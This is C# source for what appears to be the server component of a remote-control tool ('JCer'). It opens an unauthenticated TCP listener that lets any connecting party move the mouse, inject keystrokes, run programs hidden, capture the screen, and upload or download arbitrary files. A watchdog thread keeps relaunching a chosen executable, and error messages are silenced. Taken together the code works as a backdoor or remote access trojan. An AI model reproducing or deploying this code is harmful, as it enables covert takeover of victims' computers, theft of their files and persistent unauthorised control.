using JCServer;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Media;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Linq;

namespace JCer
{
    class Program
    {
        static public string ProtectFileName = "";

        static void OutputErrorMessage(Exception e)
        {
            /*Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("$ error = " + e.Message);
            Console.ForegroundColor = ConsoleColor.White;*/
        }

        static bool Send(Socket s, string message)
        {
            try
            {
                TCPSocket.Send(s, message);
                return true;
            }
            catch (Exception e)
            {
                OutputErrorMessage(e);
            }
            return false;
        }

        static string Recv(Socket s)
        {
            try
            {
                return TCPSocket.Recv(s);
            }
            catch (Exception e)
            {
                OutputErrorMessage(e);
            }
            return "quit";
        }

        static bool HasProcess(string processName)
        {
            foreach (var process in Process.GetProcesses())
                if (process.ProcessName == processName)
                    return true;
            return false;
        }

        static void ProtectProcess()
        {
            while (true)
            {
                try
                {
                    if (ProtectFileName.Trim() != "" && ProtectFileName.Trim() != "null")
                    {
                        int pos = ProtectFileName.LastIndexOf("\\");
                        if (!HasProcess(ProtectFileName.Substring(pos + 1)))
                        {
                            new Thread(() =>
                            {
                                try
                                {
                                    Process p = new Process();
                                    p.StartInfo.FileName = ProtectFileName;
                                    p.StartInfo.UseShellExecute = false;
                                    p.StartInfo.CreateNoWindow = true;
                                    p.Start();
                                }
                                catch { }
                            }).Start();
                        }
                    }
                    Thread.Sleep(60);
                }
                catch { }
            }
        }

        //注意，这些功能仅限 WindowsOS
        [DllImport("user32.dll")]
        private static extern int SetCursorPos(int x, int y);                                               //设置鼠标坐标

        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);          //模拟键盘

        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); //桌面壁纸

        [DllImport("user32.dll")]
        private static extern int mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);    //模拟鼠标
        //移动鼠标 
        const int MOUSEEVENTF_MOVE = 0x0001;
        //模拟鼠标左键按下 
        const int MOUSEEVENTF_LEFTDOWN = 0x0002;
        //模拟鼠标左键抬起 
        const int MOUSEEVENTF_LEFTUP = 0x0004;
        //模拟鼠标右键按下 
        const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
        //模拟鼠标右键抬起 
        const int MOUSEEVENTF_RIGHTUP = 0x0010;
        //模拟鼠标中键按下 
        const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        //模拟鼠标中键抬起 
        const int MOUSEEVENTF_MIDDLEUP = 0x0040;
        //标示是否采用绝对坐标 
        const int MOUSEEVENTF_ABSOLUTE = 0x8000;
        //模拟鼠标滚轮滚动操作，必须配合dwData参数
        const int MOUSEEVENTF_WHEEL = 0x0800;

        private static Dictionary<string, SoundPlayer> player = new Dictionary<string, SoundPlayer>();

        private class UploadFileToSocket : IDisposable
        {
            private FileStream file = null;

            public UploadFileToSocket(string fileName) => file = new FileStream(fileName, FileMode.Open, FileAccess.Read);

            ~UploadFileToSocket() => file.Close();

            public void Dispose() => file.Close();

            public byte[] Handle()
            {
                byte[] bytes = new byte[4 * 1024 * 1024]; //每次发送4MB
                long position = file.Position;
                file.Read(bytes, 0, bytes.Length);
                return bytes.Take(file.Length - position > 4 * 1024l * 1024l ? 4 * 1024 * 1024 : (int)(file.Length - position)).ToArray();
            }

            public long Length
            {
                get
                {
                    return file.Length;
                }
            }
        }

        private class DownloadFileFromSocket : IDisposable
        {
            private FileStream file = null;

            public DownloadFileFromSocket(string filename) => file = new FileStream(filename, FileMode.Create, FileAccess.Write);
            ~DownloadFileFromSocket() => file.Close();

            public void Dispose() => file.Close();

            public void Handle(byte[] message) => file.Write(message, 0, message.Length);

            public long Length
            {
                get
                {
                    return file.Length;
                }
            }
        }

        /// <summary>
        /// 匹配命令缩写
        /// </summary>
        /// <param name="input">输入的命令</param>
        /// <param name="command">匹配的命令</param>
        /// <param name="command2">命令缩写</param>
        /// <param name="splitLength">命令缩写长度</param>
        /// <returns></returns>
        static bool SimpleCommand(string input, string command, string command2 = "", int splitLength = 1)
        {
            return input == command || (command2 != "" && input == command2) || (splitLength > 0 && input == command.Substring(0, splitLength));
        }

        static void RequestConnect(object o)
        {
            Socket accept = (Socket)o;

            string recv = Recv(accept);
            while (!SimpleCommand(recv, "quit"))
            {
                try
                {
                    InforProc m = new InforProc(recv);

                    if (SimpleCommand(m[0], "mouse"))
                    {
                        if (SimpleCommand(m[1], "move") && m.Count == 4)
                        {
                            SetCursorPos(int.Parse(m[2]), int.Parse(m[3]));
                            if (!Send(accept, "ok"))
                                break;
                        }
                        else if (SimpleCommand(m[1], "click") && m.Count == 3)
                        {
                            if (SimpleCommand(m[2], "left") || SimpleCommand(m[2], "middle") || SimpleCommand(m[2], "right"))
                            {
                                if (SimpleCommand(m[2], "left"))
                                {
                                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                                }
                                else if (SimpleCommand(m[2], "middle"))
                                {
                                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                                }
                                else if (SimpleCommand(m[2], "right"))
                                {
                                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                                }

                                if (!Send(accept, "ok"))
                                    break;
                            }
                            else
                            {
                                if (!Send(accept, "$ error = unrecognized command"))
                                    break;
                            }
                        }
                        else if (SimpleCommand(m[1], "double-click", "dc", 0) && m.Count == 3)
                        {
                            if (SimpleCommand(m[2], "left") || SimpleCommand(m[2], "middle") || SimpleCommand(m[2], "right"))
                            {
                                if (SimpleCommand(m[2], "left"))
                                {
                                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                                }
                                else if (SimpleCommand(m[2], "middle"))
                                {
                                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                                }
                                else if (SimpleCommand(m[2], "right"))
                                {
                                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                                }

                                if (!Send(accept, "ok"))
                                    break;
                            }
                            else
                            {
                                if (!Send(accept, "$ error = unrecognized command"))
                                    break;
                            }
                        }
                        else
                        {
                            if (!Send(accept, "$ error = unrecognized command"))
                                break;
                        }
                    }

                    // 注意，keybd_event 仅在 Windows 上受支持
                    else if (SimpleCommand(m[0], "key"))
                    {
                        if (SimpleCommand(m[1], "down") || SimpleCommand(m[1], "up") || SimpleCommand(m[1], "push") && m.Count == 3)
                        {
                            if (SimpleCommand(m[1], "down") || SimpleCommand(m[1], "up"))
                            {
                                if (m[2] == "ctrl")
                                    m[2] = "17";
                                else if (m[2] == "shift")
                                    m[2] = "16";
                                else if (m[2] == "esc")
                                    m[2] = "27";
                                else if (m[2] == "backspace" || m[2] == "back")
                                    m[2] = "8";
                                else if (m[2] == "tab")
                                    m[2] = "9";
                                else if (m[2] == "clear")
                                    m[2] = "12";
                                else if (m[2] == "enter")
                                    m[2] = "13";
                                else if (m[2] == "alt")
                                    m[2] = "18";
                                else if (m[2] == "caps_lock" || m[2] == "capslock" || m[2] == "caps")
                                    m[2] = "20";
                                else if (m[2] == "delete")
                                    m[2] = "46";
                                else if (m[2] == "num_lock" || m[2] == "numlock" || m[2] == "num")
                                    m[2] = "144";

                                if (SimpleCommand(m[1], "down") && m.Count == 3)
                                {
                                    keybd_event((byte)long.Parse(m[2]), 0, 0, 0);
                                }
                                else if (SimpleCommand(m[1], "up") && m.Count == 3)
                                {
                                    keybd_event((byte)long.Parse(m[2]), 0, 2, 0);
                                }
                            }
                            else if (SimpleCommand(m[1], "push") && m.Count == 3)
                            {
                                /*
                                foreach (char c in m[2])
                                {
                                    keybd_event((byte)c, 0, 0, 0);
                                    keybd_event((byte)c, 0, 2, 0);
                                }*/
                                SendKeys.SendWait(m[2]);
                            }
                            if (!Send(accept, "ok"))
                                break;
                        }
                        else
                        {
                            if (!Send(accept, "unrecognized command"))
                                break;
                        }
                    }

                    else if (SimpleCommand(m[0], "shell") && m.Count >= 2)
                    {
                        string arg = "";
                        for (int i = 2; i < m.Count; ++i) arg += "\"" + m[i] + "\" ";
                        if (arg != "")
                            Process.Start(m[1], arg);
                        else
                            Process.Start(m[1]);

                        if (!Send(accept, "ok"))
                            break;
                    }

                    else if (SimpleCommand(m[0], "shell-hide", "sh", 0) && m.Count >= 2)
                    {
                        string arg = "";
                        for (int i = 2; i < m.Count; ++i) arg += "\"" + m[i] + "\" ";

                        new Thread(() =>
                        {
                            try
                            {
                                Process p = new Process();
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.Arguments = arg;
                                p.StartInfo.FileName = m[1];
                                p.Start();
                                p.WaitForExit();
                                p.Close();
                            }
                            catch { }
                        }).Start();

                        if (!Send(accept, "ok"))
                            break;
                    }

                    // 注意，System.Media.SoundPlayer 仅在 Windows 上受支持，若要在 Linux 或其他系统上使用，请删除或使用其他库来代替 System.Windows.Extensions (NuGet包)
                    else if (m[0] == "media")
                    {
                        if (m[1] == "create" && m.Count == 4)
                        {
                            if (player.ContainsKey(m[2]))
                            {
                                if (!Send(accept, "\"" + m[2] + "\" was exist :("))
                                    break;
                            }
                            else
                            {
                                string result = "ok";
                                player.Add(m[2], new SoundPlayer(m[3])); //创建至字典
                                if (!Send(accept, result))
                                    break;
                            }
                        }
                        else if (m[1] == "timeout" && m.Count == 3)
                        {
                            if (player.ContainsKey(m[2]))
                            {
                                string result = "ok";
                                player[m[2]].LoadTimeout = int.Parse(m[2]);
                                if (!Send(accept, result))
                                    break;
                            }
                            else if (!Send(accept, "$ can't find \"" + m[2] + "\" :("))
                                break;
                        }
                        else if (m[1] == "load" && m.Count == 3)
                        {
                            if (player.ContainsKey(m[2]))
                            {
                                string result = "ok";
                                player[m[2]].Load();
                                if (!Send(accept, result))
                                    break;
                            }
                            else if (!Send(accept, "can't find \"" + m[2] + "\" :("))
                                break;
                        }
                        else if (m[1] == "play" && m.Count == 3)
                        {
                            if (player.ContainsKey(m[2]))
                            {
                                string result = "ok";
                                player[m[2]].PlayLooping();
                                if (!Send(accept, result))
                                    break;
                            }
                            else if (!Send(accept, "can't find \"" + m[2] + "\" :("))
                                break;
                        }
                        else if (m[1] == "stop" && m.Count == 3)
                        {
                            if (player.ContainsKey(m[2]))
                            {
                                string result = "ok";
                                player[m[2]].Stop();
                                if (!Send(accept, result))
                                    break;
                            }
                            else if (!Send(accept, "Can't find \"" + m[2] + "\" :("))
                                break;
                        }
                        else if (m[1] == "delete" && m.Count == 3)
                        {
                            if (player.ContainsKey(m[2]))
                            {
                                string result = "ok";
                                player[m[2]].Dispose();
                                player.Remove(m[2]);
                                if (!Send(accept, result))
                                    break;
                            }
                            else if (!Send(accept, "can't find \"" + m[2] + "\" :("))
                                break;
                        }
                        else
                        {
                            if (!Send(accept, "unrecognized command"))
                                break;
                        }
                    }

                    //进程保护
                    else if (SimpleCommand(m[0], "protect") && m.Count == 2)
                    {
                        ProtectFileName = m[1];
                        if (!File.Exists(m[1]) && m[1] != "null")
                        {
                            if (!Send(accept, "Waring: Can't find \"" + m[1] + "\" QwQ"))
                                break;
                        }
                        else if (!Send(accept, "ok")) break;

                    }

                    //桌面背景
                    else if (SimpleCommand(m[0], "background", "", 4) && m.Count == 2)
                    {
                        if (!File.Exists(m[1]))
                        {
                            if (!Send(accept, "\"" + m[1] + "\" doesn't exist :("))
                                break;
                        }
                        else
                        {
                            SystemParametersInfo(20, 1, m[1], 1);
                            if (!Send(accept, "ok"))
                                break;
                        }
                    }

                    //遍历文件和文件夹
                    else if (m[0] == "dir" && m.Count == 2)
                    {
                        if (!Directory.Exists(m[1]))
                        {
                            if (!Send(accept, "\"" + m[1] + "\" doesn't exist :("))
                                break;
                        }
                        else
                        {
                            string[] fileArray = Directory.GetFiles(m[1]);
                            string[] dirArray = Directory.GetDirectories(m[1]);
                            int maxLength = -1;

                            foreach (string s in fileArray)
                                if (s.Length > maxLength) maxLength = s.Length;
                            foreach (string s in dirArray)
                                if (s.Length > maxLength) maxLength = s.Length;

                            while (maxLength % 4 != 0)
                                ++maxLength;

                            string format = "{0,-" + (maxLength).ToString() + "}";

                            string sendString = "\n\n  " + string.Format(format, "Name") + string.Format("{0,-20}", "Length") + string.Format("{0,-30}", "Last Write Time") + "\n";
                            for (int iter = 0; iter < maxLength + 20 + 30; ++iter)
                                sendString += "-";
                            sendString += "\n";

                            foreach (string s in fileArray)
                            {
                                FileInfo info = new FileInfo(s);
                                sendString += "  " + string.Format(format, s.Substring(s.LastIndexOf('\\') + 1)) + string.Format("{0,-20}", info.Length.ToString()) + string.Format("{0,-30}", info.LastWriteTime.ToString()) + "\n";
                            }
                            foreach (string s in dirArray)
                            {
                                DirectoryInfo info = new DirectoryInfo(s);
                                sendString += "  " + string.Format(format, s.Substring(s.LastIndexOf('\\') + 1)) + string.Format("{0,-20}", "Directory") + string.Format("{0,-30}", info.LastWriteTime.ToString()) + "\n";
                            }

                            if (!Send(accept, sendString))
                                break;
                        }
                    }

                    else if (SimpleCommand(m[0], "screen", "", 2))
                    {
                        if (m.Count > 2)
                        {
                            if (!Send(accept, "unrecognized command"))
                                break;
                        }
                        else
                        {
                            ImageFormat format;
                            if (m[1] == "png")
                            {
                                format = ImageFormat.Png;
                            }
                            else
                            {
                                format = ImageFormat.Jpeg;
                            }

                            Image img = new Bitmap(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[0].Bounds.Height);
                            Graphics g = Graphics.FromImage(img);
                            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);

                            MemoryStream ms = new MemoryStream();
                            img.Save(ms, format);

                            byte[] imgByte = ms.ToArray();
                            TCPSocket.Send(accept, imgByte);

                            ms.Close();

                            Recv(accept);
                            if (!Send(accept, "ok"))
                                break;
                        }
                    }

                    else if (SimpleCommand(m[0], "upload") && m.Count == 2)
                    {
                        /* 格式
                         * upload 文件名
                         */

                        TCPSocket.Send(accept, "ok");
                        /*long totalLen = long.Parse(m[1]);
                        using (FileStream w = new FileStream(m[2], FileMode.Create, FileAccess.Write))
                        {
                            while (totalLen > 0)
                            {
                                byte[] file = new byte[16 * 1024 * 1024]; //每次接收4MB
                                int recvLen = accept.Receive(file, totalLen < 16 * 1024 * 1024 ? (int)totalLen : 16 * 1024 * 1024, 0);
                                if (recvLen <= 0) break;
                                Task t = w.WriteAsync(file, 0, recvLen);
                                while (!t.IsCompleted) ;

                                totalLen -= recvLen;
                            }
                        }*/

                        DownloadFileFromSocket down = new DownloadFileFromSocket(m[1]);
                        TCPSocket.Recv(accept, down.Handle);
                        down.Dispose();

                        if (!Send(accept, "ok"))
                            break;
                    }
                    else if (SimpleCommand(m[0], "download") && m.Count == 2)
                    {
                        if (!File.Exists(m[1]))
                        {
                            Send(accept, "error");
                            Send(accept, "Can't find the file");
                            throw new Exception("can't find the file");
                        }
                        else Send(accept, "ok");

                        UploadFileToSocket up = new UploadFileToSocket(m[1]);
                        TCPSocket.Send(accept, up.Length, up.Handle);

                        Recv(accept);
                        up.Dispose();
                        if (!Send(accept, "ok"))
                            break;
                    }
                    else
                    {
                        if (!Send(accept, "unrecognized command"))
                            break;
                    }
                }
                catch (Exception e)
                {
                    if (!Send(accept, e.Message))
                        break;
                }
                recv = Recv(accept);
            }
        }

        /// <summary>
        /// 监听JCClient的连接
        /// </summary>
        /// <param name="port">监听的端口</param>
        static void Request(int port)
        {
            Socket query = null;
            try
            {
                query = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                query.Bind(new IPEndPoint(IPAddress.Any, port)); //端口
                query.Listen(10); //最多被10个人控制

                while (true)
                    RequestConnect(query.Accept());
                //query.Close();
            }
            catch (Exception) //只有出现异常清空才停止监听，退出进程
            {
                if (query != null)
                    query.Close();
            }
        }

        static void Main(string[] args)
        {
            int port = 5800;
            if (args.Length > 0)
                try
                {
                    port = int.Parse(args[0]);
                }
                catch { }

            Thread t = new Thread(ProtectProcess);
            t.Start();
            Request(port);

            return;
        }
    }
}